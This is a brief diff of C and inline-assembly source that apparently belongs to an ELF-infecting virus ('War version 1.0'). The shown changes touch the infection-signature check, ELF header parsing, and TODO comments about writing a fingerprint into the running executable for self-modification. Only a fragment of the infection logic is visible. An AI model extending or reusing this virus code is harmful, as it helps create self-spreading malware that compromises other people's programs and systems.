@@ -39,7 +39,6 @@ void _start(void)
 	void *begin_ptr;
 	char  path[11];
 	char *prgm;
-
 	asm volatile("leaq str6(%%rip), %0\n"
 				 "jmp end6\n"
 				 "str6: .ascii \"doom-nukem\\0\"\n"
@@ -316,13 +315,16 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 				 "movq $end4-str4, %1\n"
 				 "jmp end4\n"
 				 "str4: .ascii \"\\nWar version 1.0 (c)oded by xxxxxxx - "
-				 "yyyyyy\\0\" \n "
+				 "yyyyyy - [42694269]\\0\" \n "
 				 "end4:\n"
 				 : "=r"(ALPHA), "=r"(OMEGA));
 	int i = 0;
 	while (i + OMEGA < statbuf->st_size)
 		if (!evaluateDriftSignature(*file_data + i++, ALPHA, OMEGA))
 			goto error;
+	// TODO: write filedata to edit fingerprint :
+	// FINGERPRINT = crc32(inode ^ size ^ timestamp_ms)
+	// TODO: write finger inside currently executed file
 	elf->header = (ElfW(Ehdr) *) *file_data;
 	*enlarging = VARAX;
 	*enlarging += elf->header->e_phentsize * (elf->header->e_phnum + 1);
